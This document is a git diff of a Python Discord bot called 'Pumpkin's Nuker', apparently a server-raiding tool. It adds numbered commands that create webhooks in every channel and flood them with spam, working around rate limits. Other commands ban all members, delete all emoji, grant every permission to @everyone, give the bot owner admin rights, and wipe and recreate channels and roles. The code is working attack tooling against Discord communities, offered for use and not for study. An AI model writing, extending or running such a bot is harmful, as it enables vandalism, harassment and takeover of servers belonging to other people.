@@ -2,15 +2,35 @@ import discord
 from discord.ext import commands
 import json
 import random
-import string
+import colorama
+import aiohttp
+import sys
 import asyncio
 import requests
 import os
 import time
+import itertools
+from colorama import Fore
+from discord import Permissions
+from discord.ext import commands
+
+colorama.init()
+
 
 with open('config.json', 'r') as file:
     config = json.load(file)
   
+  
+embedColor = 0x5c92ff
+colors = {"main": Fore.CYAN,
+          "white": Fore.WHITE,
+          "red": Fore.RED}
+msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
+        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
+        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
+        "input": f"{colors['white']}{colors['main']}>>{colors['white']}",
+        "pressenter": f"{colors['white']}[{colors['main']}i{colors['white']}] Press ENTER to exit"}
+        
 
 TOKEN = config['token']
 GUILD_IDS = config['guild_ids']
@@ -24,76 +44,86 @@ NUM_ROLES = config['num_roles']
 
 
 intents = discord.Intents.all()
+intents.members = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name}')
-  
+    print(f"\n\n{colors['main']}" + ("═"*75).center(95) + f"\n{colors['white']}" + 
+          f"Logged in as {bot.user}".center(95) + "\n" +
+          f"Prefix: {bot.command_prefix}".center(95) + "\n" +
+          f"Total servers: {len(bot.guilds)}".center(95) + "\n" +
+          f"Total members: {len(bot.users)} ".center(95) + f"\n{colors['main']}" + ("═"*75).center(95) + f"\n\n{colors['white']}")
+    print("Connected Servers: ")
+    for guild in bot.guilds:
+        print(guild.name)
 
 def is_owner():
     async def predicate(ctx):
         return ctx.author.id == OWNER_ID
     return commands.check(predicate)
- 
 
-@bot.command()
+
+
+@bot.command(name="3")
 async def spam(ctx):
-    os.system('title Deadhook - Config')
-    done = 1
-    messages = ''
-    
-    try:
+    with open('config.json', 'r') as file:
+        config = json.load(file)
 
-        await ctx.message.delete()
-        with open('messages.txt') as f:
-            messages = f.read()
-    except:
-        await ctx.send("Failed! Could not find 'messages.txt'.")
-        return
-    
-    with open('config.json') as config_file:
-        config = json.load(config_file)
-    
+    messages_per_channel = config['messages_per_channel']
+    rest_time = config['rest_time']
+    message_content = config['message_content']
+    webhook_names = config['webhook_names']  # List of webhook names
+
     guild = ctx.guild
-    webhooks = []
-    
-    for channel in guild.channels:
-        if isinstance(channel, discord.TextChannel):
-            webhook = await channel.create_webhook(name=config['webhook_name'])
-            webhooks.append(webhook.url)
-    
-    if len(webhooks) == 0:
-        await ctx.send("Failed! There are no text channels in the guild.")
-        return
+    channels = guild.text_channels
 
-    await ctx.send("Webhooks created. Press ENTER to start spamming.")
-    await bot.wait_for('message', check=lambda m: m.author == ctx.author)
+    print("Spamming process started.")
 
-    while done <= config['spam_times']:
-        tempMsg = random.choice(messages.splitlines())
+    try:
+        async with aiohttp.ClientSession() as session:
+            webhook_list = []
+            for channel in channels:
+                webhook = await channel.create_webhook(name=webhook_names[0])  # Use the first webhook name in the list
+                webhook_list.append(webhook)
+                await asyncio.sleep(1)  # Add a delay of 1 second between webhook creation
+
+            for _ in range(20):  # 20 rounds of spamming
+                for _ in range(messages_per_channel):
+                    embed = discord.Embed(
+                        title='Spam',
+                        description=message_content
+                    )
+                    tasks = []
+                    for webhook in webhook_list:
+                        # Create a task for each webhook to send the message concurrently
+                        tasks.append(webhook.send(content=message_content, embed=embed))
+
+                    while True:
+                        try:
+                            # Execute all webhook send tasks concurrently
+                            await asyncio.gather(*tasks)
+                            break  # Break the loop if no rate limit encountered
+                        except aiohttp.ClientResponseError as e:
+                            if e.status == 429:  # Rate limited
+                                print("Rate limited! Retrying after exponential backoff...")
+                                retry_after = int(e.headers.get('Retry-After', '1'))
+                                await asyncio.sleep(retry_after + 1)  # Add additional wait time
+                                print("Continuing spamming...")  # Debug print statement
+                            else:
+                                print("Error sending webhook message:", e)  # Debug print statement
+                                raise  # Re-raise the exception if it's not a rate limit
+
+                    await asyncio.sleep(rest_time)
+
+            for webhook in webhook_list:
+                await webhook.delete()
+
+    except aiohttp.ClientError as e:
+        print(f"Error sending webhook message: {e}")
         
-        for webhook_url in webhooks:
-            w = requests.post(webhook_url, json={'content': tempMsg})
-            
-            if w.status_code == 429:
-                print("Failed! Ratelimited! Waiting a couple of seconds...")
-                time.sleep(2)
-            else:
-                print(f"Success! Sent message '{tempMsg}'! (#{done})")
-        
-        done += 1
-    
-    print("Spamming completed.")
 
-    for webhook_url in webhooks:
-        requests.delete(webhook_url)
-    
-    print("Webhooks deleted.")
-              
-
-
-@bot.command()
+@bot.command(name="1")
 @is_owner()
 async def nuke(ctx):
     try:
@@ -185,9 +215,38 @@ async def spam_roles(guild, num_roles, deleted_roles):
     except Exception as e:
         print(f'Error creating spam roles in {guild.name}: {e}')
 
-@bot.command()
+
+
+@bot.command(name="6")
 @is_owner()
-async def admin(ctx):
+@commands.has_permissions(manage_roles=True)
+async def adminall(ctx):
+    await ctx.message.delete()
+    role = ctx.guild.default_role
+    permissions = discord.Permissions.all()
+    await role.edit(permissions=permissions)
+    print(f'All permissions granted to @everyone')
+
+
+@bot.command(name="5")
+@is_owner()
+async def emojidelete(ctx):
+  await ctx.message.delete()
+  for emoji in list(ctx.guild.emojis):
+    try:
+      await emoji.delete()
+      print(f"successfully deleted emoji {emoji.name}!")
+    except Exception as e:
+      print(f"error deleting emoji {emoji.name}!: {e}")
+      
+
+
+  # WIP
+            
+
+@bot.command(name="4")
+@is_owner()
+async def getadmin(ctx):
     try:
         guild = ctx.guild
 
@@ -207,11 +266,11 @@ async def admin(ctx):
 
     except Exception as e:
         print(f'Error in admin command: {e}')
-
-
-@bot.command()
+        
+       
+@bot.command(name="2")
 @is_owner()
-async def ban(ctx):
+async def banall(ctx):
     try:
         await ctx.message.delete()
         guild = ctx.guild
@@ -231,18 +290,20 @@ async def ban(ctx):
     except Exception as e:
         print(f'Error banning people in {guild.name}: {e}')
 
+
 @bot.command()
 @is_owner()
 async def cmd(ctx):
     embed = discord.Embed(title="Pumpkin's Nuker", description='List of available commands:', color=discord.Color.blue())
 
-    embed.add_field(name='!nuke', value="change server's name, icon, delete channels, delete roles, create channels, create roles. ", inline=False)
-    embed.add_field(name="!ban", value="ban members", inline=False)
-    embed.add_field(name="!spam", value="spam messages", inline=False)
-    embed.add_field(name='!admin', value='gives an admin role to the owner of the bot', inline=False)
+    embed.add_field(name='!1', value="change server's name, icon, delete channels, delete roles, create channels, create roles. ", inline=False)
+    embed.add_field(name="!2", value="ban members", inline=False)
+    embed.add_field(name="!3", value="spam messages", inline=False)
+    embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
+    embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
+    embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
     embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
   
     await ctx.author.send(embed=embed)
 
 bot.run(TOKEN)
-  
